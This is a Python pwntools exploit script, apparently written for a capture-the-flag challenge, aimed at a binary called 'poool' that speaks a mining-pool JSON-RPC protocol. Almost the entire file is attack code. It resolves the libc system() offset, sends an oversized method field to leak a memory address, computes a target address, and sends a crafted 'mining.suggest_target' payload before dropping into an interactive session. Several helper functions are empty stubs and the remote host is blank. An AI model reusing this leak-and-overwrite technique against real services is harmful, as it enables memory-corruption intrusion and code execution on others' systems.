#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = ''
port = 0

binary = "./poool"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new():
  pass

def edit():
  pass

def remove():
  pass

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  payload = '{"id":"1234","method":"client.exchange.flag","params":[222]}'
  print payload
  r.sendline(payload)
  print repr(r.recv(0x100))
  r.sendline("{\"id\":123,\"method\":\"" + "A"*0x100 + "\",\"params\":[\"123\"]}")
  print repr(r.recv(0x100))
  m_addr = u64(r.recv(6).ljust(8,"\x00")) - 0xbf1
  m_addr += 0x1d60
  print("m_addr = {}".format(hex(m_addr))) 
  print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(m_addr)[0:2] + '","'+ p64(m_addr)[3:6] + '":""}'
  print payload
  raw_input("@")
  r.sendline(payload)
  r.interactive()

